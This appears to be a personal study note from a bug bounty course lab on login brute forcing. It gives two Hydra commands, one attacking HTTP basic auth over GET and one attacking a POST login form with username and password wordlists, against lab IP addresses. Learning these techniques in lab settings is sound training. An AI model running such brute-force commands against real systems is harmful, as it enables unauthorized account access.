# Hydra

## GET

![Pasted image 20241004131226.png](../../assets/images/a6fbc61716f8b3053089.png)

![Pasted image 20241004131402.png](../../assets/images/a0a8cb52fa503d2ea978.png)

![Pasted image 20241004131415.png](../../assets/images/f22ded1bcb8ab3a46072.png)

```bash
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 83.136.254.47 http-get / -s 52283
```

[Captura pendiente de revisión: Pasted image 20241004131840.png](../../Resources/Audit/media.csv)

![Pasted image 20241004132934.png](../../assets/images/49c24c3f33cdfb29f4a0.png)

## POST

![Pasted image 20241004134542.png](../../assets/images/131fe4618f805d636687.png)

![Pasted image 20241004134603.png](../../assets/images/93a82657fa02ceca32df.png)

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 94.237.49.214 -s 37645 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

[Captura pendiente de revisión: Pasted image 20241004134809.png](../../Resources/Audit/media.csv)

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | 13- Login Brute Forcing/2 - Hydra.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
